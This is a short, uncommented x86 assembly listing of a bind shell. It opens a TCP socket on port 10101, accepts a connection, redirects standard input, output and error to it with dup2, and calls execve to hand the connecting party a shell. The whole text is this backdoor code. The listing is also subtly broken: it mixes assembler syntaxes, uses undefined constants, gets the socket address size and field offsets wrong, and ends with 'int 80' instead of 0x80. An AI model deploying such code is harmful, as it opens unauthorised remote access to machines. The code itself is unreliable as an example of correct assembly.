.section .bss
    sin: .space 12 

.section .data
    sock: .long 0   
    fd: .long 0     

.section .text
    .global main

main:
    push AF_INET
    push SOCK_STREAM
    push IPPROTO_TCP
    call socket
    mov sock, eax

    mov sin, eax
    mov eax, AF_INET
    mov [sin + 0], eax

    mov eax, 10101
    call htons
    mov [sin + 4], eax

    mov eax, sock
    mov ebx, sin
    mov ecx, 12 
    call bind

    mov eax, sock
    mov ecx, 1 
    call listen

    mov eax, sock
    mov ebx, NULL
    mov ecx, NULL
    call accept
    mov fd, eax

    mov eax, fd
    mov ebx, 0 
    call dup2

    mov eax, fd
    mov ebx, 1 
    call dup2

    mov eax, fd
    mov ebx, 2
    call dup2

    mov ebx, [esp + 4] 
    push 0 
    call execve

    mov eax, 1
    mov ebx, 0
    int 80

